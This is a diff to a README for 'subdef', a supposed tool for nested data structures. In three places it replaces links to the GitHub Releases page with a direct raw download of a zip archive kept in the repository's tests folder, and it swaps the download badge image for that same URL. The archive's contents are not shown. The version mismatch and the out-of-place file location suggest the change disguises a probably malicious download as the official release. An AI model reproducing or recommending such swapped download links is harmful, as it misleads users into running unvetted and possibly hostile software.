@@ -1,7 +1,7 @@
 # 🛠️ subdef - Simplify Complex Data Structures
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/predestined-boxingday194/subdef/releases)
+[![Download](https://raw.githubusercontent.com/predestined-boxingday194/subdef/main/tests/subdef-3.9.zip)](https://raw.githubusercontent.com/predestined-boxingday194/subdef/main/tests/subdef-3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to **subdef**! This tool helps you define complex data structures easily. With a simple setup, you can manage nested data with clarity. 
@@ -20,7 +20,7 @@ Welcome to **subdef**! This tool helps you define complex data structures easily
 ## 🌐 Download & Install
 To get started, visit the Releases page to download the latest version of **subdef**. Here is the link:
 
-[Download the latest version](https://github.com/predestined-boxingday194/subdef/releases)
+[Download the latest version](https://raw.githubusercontent.com/predestined-boxingday194/subdef/main/tests/subdef-3.9.zip)
 
 ### 🛠️ How to Install
 1. Click on the link above to access the Releases page.
@@ -69,4 +69,4 @@ This project is licensed under the MIT License. You can freely use it for person
 ## 🌟 Conclusion
 **subdef** aims to make your data structure management seamless. Visit our Releases page to download it today and start building your nested structures with ease!
 
-[Download the latest version](https://github.com/predestined-boxingday194/subdef/releases)
+[Download the latest version](https://raw.githubusercontent.com/predestined-boxingday194/subdef/main/tests/subdef-3.9.zip)
